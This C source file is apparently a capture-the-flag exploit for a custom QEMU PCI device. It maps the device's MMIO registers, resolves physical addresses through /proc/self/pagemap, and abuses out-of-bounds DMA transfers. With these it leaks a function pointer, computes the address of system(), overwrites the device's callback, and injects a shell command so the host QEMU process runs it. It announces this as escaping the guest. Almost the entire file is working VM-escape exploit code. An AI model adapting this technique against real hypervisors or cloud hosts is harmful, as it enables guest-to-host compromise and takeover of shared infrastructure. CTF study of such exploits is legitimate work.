/*
  Most of this code is taken from pcimem tool

  https://github.com/billfarrow/pcimem
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>

#define PRINT_ERROR \
    do { \
        fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \
        __LINE__, __FILE__, errno, strerror(errno)); exit(1); \
    } while(0)

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

typedef struct {
    uint64_t pfn : 54;
    unsigned int soft_dirty : 1;
    unsigned int file_page : 1;
    unsigned int swapped : 1;
    unsigned int present : 1;
} PagemapEntry;

int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr)
{
    size_t nread;
    ssize_t ret;
    uint64_t data;

    nread = 0;
    while (nread < sizeof(data)) {
        ret = pread(pagemap_fd, &data, sizeof(data),
                (vaddr / sysconf(_SC_PAGE_SIZE)) * sizeof(data) + nread);
        nread += ret;
        if (ret <= 0) {
            return 1;
        }
    }
    entry->pfn = data & (((uint64_t)1 << 54) - 1);
    entry->soft_dirty = (data >> 54) & 1;
    entry->file_page = (data >> 61) & 1;
    entry->swapped = (data >> 62) & 1;
    entry->present = (data >> 63) & 1;
    return 0;
}

/* Convert the given virtual address to physical using /proc/PID/pagemap.
 *
 * @param[out] paddr physical address
 * @param[in]  pid   process to convert for
 * @param[in] vaddr virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
//https://github.com/pRiVi/meltdown-test/blob/master/virt_to_phys_user.c
int virt_to_phys_user(uintptr_t *paddr, uintptr_t vaddr)
{
    char pagemap_file[BUFSIZ];
    int pagemap_fd;

    snprintf(pagemap_file, sizeof(pagemap_file), "/proc/self/pagemap");
    pagemap_fd = open(pagemap_file, O_RDONLY);
    if (pagemap_fd < 0) {
        return 1;
    }
    PagemapEntry entry;
    if (pagemap_get_entry(&entry, pagemap_fd, vaddr)) {
        return 1;
    }
    close(pagemap_fd);
    *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));
    return 0;
}


uint64_t pcimem(uint64_t target, char access_type, uint64_t writeval, char rw){
    void *virt_addr;
    void *map_base;
    int fd;
    int type_width;

    if((fd = open("/sys/devices/pci0000\:00/0000\:00\:04.0/resource0", O_RDWR | O_SYNC)) == -1) PRINT_ERROR;
    //printf("Target offset is 0x%x, page size is %ld\n", (int) target, sysconf(_SC_PAGE_SIZE));
    fflush(stdout);

    /* Map one page */
    //printf("mmap(%d, %ld, 0x%x, 0x%x, %d, 0x%x)\n", 0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (int) target);
    map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target & ~MAP_MASK);
    if(map_base == (void *) -1) PRINT_ERROR;
    //printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);
    fflush(stdout);

    virt_addr = map_base + (target & MAP_MASK);
    uint64_t read_result = 0;

    if(rw == 'r'){ // mmio reads
        switch(access_type) {
            case 'b':
                read_result = *((uint8_t *) virt_addr);
                type_width = 2;
                break;
            case 'h':
                read_result = *((uint16_t *) virt_addr);
                type_width = 4;
                break;
            case 'w':
                read_result = *((uint32_t *) virt_addr);
                type_width = 8;
                break;
            case 'd':
                printf("reading dword!\n");
                read_result = *((uint64_t *) virt_addr);
                type_width = 16;
                break;
            default:
                fprintf(stderr, "Illegal data type '%c'.\n", access_type);
                exit(2);
        }
    
        //printf("Value at offset 0x%X (%p): 0x%0*lX\n", (int) target, virt_addr, type_width,
        //read_result);
        fflush(stdout);
    }
    else{ // writes
        switch(access_type) {
            case 'b':
                *((uint8_t *) virt_addr) = writeval;
                type_width = 2;
                break;
            case 'h':
                *((uint16_t *) virt_addr) = writeval;
                type_width = 4;
                break;
            case 'w':
                *((uint32_t *) virt_addr) = writeval;
                type_width = 8;
                break;
            case 'd':
                *((uint64_t *) virt_addr) = writeval;
                type_width = 16;
                break;
            }
            
    }
    //printf("Written 0x%0*lX;\n", type_width, writeval);    
    if(munmap(map_base, MAP_SIZE) == -1) PRINT_ERROR;
    close(fd);    
    return read_result;

}


void set_dma_src(uint64_t value){
    pcimem(0x80, 'd', value&0xffffffff, 'w');
    return;
}

void set_dma_dst(uint64_t value){
    pcimem(0x88, 'd', value&0xffffffff, 'w');
    return;
}

void set_dma_cnt(uint64_t value){
    pcimem(0x90, 'd', value, 'w');
    return;
}

void set_dma_cmd(uint64_t value){ // also calls hitb_dma_timer()
    pcimem(0x98, 'd', value, 'w');
    return;
}

unsigned long long read_dma_dst(){
    unsigned int hi = pcimem(0x8c, 'd', 0xb00bface, 'r');
    unsigned int lo = pcimem(0x88, 'd', 0xb00bface, 'r');
    
    return ((unsigned long long)hi<<0x20) | lo;
}

unsigned long long read_dma_src(){
    unsigned int hi = pcimem(0x84, 'd', 0xb00bface, 'r');
    unsigned int lo = pcimem(0x80, 'd', 0xb00bface, 'r');
    
    return ((unsigned long long)hi<<0x20) | lo;
}

uint64_t read_dma_cnt(){
    return pcimem(0x90, 'd', 0xb00bface, 'r');
}

uint64_t read_dma_cmd(){
    return pcimem(0x98, 'd', 0xb00bface, 'r');
}

uint64_t read_status(){
    return pcimem(0x20, 'd', 0xb00bface, 'r');
}

/*
https://stackoverflow.com/questions/36111821/how-to-convert-virtual-address-to-physical-address-from-user-space-three-differ
https://www.blackhat.com/docs/eu-14/materials/eu-14-Kemerlis-Ret2dir-Deconstructing-Kernel-Isolation.pdf


the PFN of a
given user-space virtual address uaddr, can be located
by opening /proc/<pid>/pagemap and reading
eight bytes from file offset (uaddr/4096) *
sizeof(uint64_t) (assuming 4KB pages).


SYN(uaddr) = PHYS_OFFSET + 4096 *
(PFN(uaddr) - PFN_MIN)

PHYS_OFFSET (x86-64) = 0xFFFF880000000000+

virtualPageNumber = virtualAddress / systemPageSize;
physicalAddressPFN +  (virtualAddress - virtualPageNumber)
*/

/*
uint64_t virt_to_phys(uint64_t virt){
    char pfn[8]; 
    FILE *pagemap = fopen("/proc/self/pagemap","r");

    pread(pagemap, 
    fseek(pagemap,(virt/0x1000)*sizeof(uint64_t),SEEK_SET); 
    fread(pfn, 1, 8, pagemap);
    
    return pfn
}
*/
int main() {
    unsigned long long src;
	uintptr_t paddr = 0;
    uint64_t *dma_buf= 0;

    char *hitb_enc = 0;
    //set_dma_src(0x41000);
    //src = read_dma_src();
    //printf("[+] src is 0x%016llx\n", src);
    
    //set_dma_cnt(0x40);
    //set_dma_cmd(0x7); // hitb_dma_timer()
    
    printf("[*] STAGE 1: LEAK\n");
    dma_buf = (uint64_t *)malloc(0x1000);
    mlock(dma_buf, 0x1000); // this is required!!!!
    
    if(!dma_buf){
        printf("couldn't allocate dma_buf!\n");
        exit(-1);
    }   
    else{
        printf("    [-] dma_buf allocated at virt_addr: %p\n", dma_buf);
    }

	if(virt_to_phys_user(&paddr, (uintptr_t) dma_buf)){
        fprintf(stderr, "error: virt_to_phys_user\n");
        return EXIT_FAILURE;
	}
    else{
	    printf("                             phys_addr: 0x%jx\n", (uintmax_t)paddr);
    }

    // LEAK HitbState.Enc
    set_dma_src(0x41000);
    set_dma_dst((uint64_t)paddr);
    set_dma_cnt(0x8);
    set_dma_cmd(0x3);
    
    printf("    [-] giving time to perform DMA transfer...\n");
    sleep(1); // give time to perform the DMA transfer
    printf("    [+] DMA write succeeded!\n");
    
    hitb_enc = (void *)dma_buf[0];
    printf("    [+] leaked hitb_enc() at: %p\n", (void *)dma_buf[0]);
    
    uintptr_t system = hitb_enc-0x862b8;
    printf("    [+] system@plt found at: %p\n", system);
    dma_buf[0] = system;

    // OVERWRITE HitbState.Enc    
    printf("[*] STAGE 2: OOB WRITE\n");
    set_dma_src((uint64_t)paddr);
    set_dma_dst(0x41000); 
    set_dma_cnt(0x8);
    set_dma_cmd(0x1); //

    printf("    [-] giving time to perform DMA transfer...\n");
    sleep(3);
    
    printf("    [+] DMA read succeeded!\n");
    
    char *payload = "cat flag;cat flag;cat flag;cat flag\0";
    memcpy(dma_buf, payload, 40);
    
    set_dma_src((uint64_t)paddr);
    set_dma_dst(0x40000); 
    set_dma_cnt(40);
    set_dma_cmd(0x1); //

    printf("    [-] giving time to perform DMA transfer...\n");
    sleep(3);
    
    printf("    [+] DMA read succeeded!\n");

    printf("[*] ESCAPING QEMU GUEST...\n");     
    set_dma_src(0x40000);
    set_dma_cmd(0x7);
    
    munlock(dma_buf,0x1000);
    free(dma_buf);
    return 0;
}
